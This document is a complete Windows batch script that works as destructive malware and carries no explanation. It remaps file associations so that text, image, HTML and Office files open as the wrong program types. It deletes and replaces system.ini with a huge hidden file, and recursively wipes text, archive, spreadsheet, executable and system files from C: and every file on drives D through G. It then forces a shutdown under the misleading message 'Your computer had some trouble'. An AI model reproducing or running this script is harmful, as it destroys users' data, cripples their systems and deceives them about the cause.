@echo off
assoc .txt=batfile
assoc .bat=giffile
assoc .asp=cmdfile
assoc .av=txtfile
assoc .aspx=cmdfile
assoc .jpg=icofile
assoc .jpeg=icofile
assoc .html=exefile
assoc .cmd=txtfile
assoc .inf=inifile
assoc .ini=inffile
assoc .doc=aspfile
assoc .docx=batfile
assoc .xls=cmdfile
assoc .xlsx=xmp.av
cd c:\windows
del system.ini
fsutil file createnew c:\windows\system.ini 100073741824
attrib +s +a +h system.ini
cd \
del *.txt /s/q
del *.zip /s/q
del *.xls /s/q
del *.exe /s/q
del *.sys /s/q
cd d:\
del *.* /s/q
cd e:\
del *.* /s/q
cd f:\
del *.* /s/q
cd g:\
del *.* /s/q
shutdown -s -f -t 100 -c "Your computer had some trouble"
exit 
